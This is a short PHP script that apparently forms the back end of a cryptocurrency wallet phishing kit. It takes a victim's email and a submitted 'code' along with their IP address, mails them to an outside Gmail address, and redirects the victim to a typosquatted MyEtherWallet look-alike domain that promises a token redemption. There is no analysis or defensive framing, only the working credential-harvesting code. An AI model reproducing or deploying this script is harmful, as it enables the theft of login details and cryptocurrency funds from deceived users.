<?php
$email = $_POST['email'];
$code = $_POST['code'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];

$formcontent=" User: $email \n $code \n  ip: $ip";
$recipient = "trendsalevip@gmail.com";
$subject = "zau";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='https://myethervvallet.date/view-wallet-info-your-redeem-financiacoin-token-successfully.htm'> Return Home</a>";
header("Location: https://myethervvallet.date/view-wallet-info-your-redeem-financiacoin-token-successfully.htm");
?>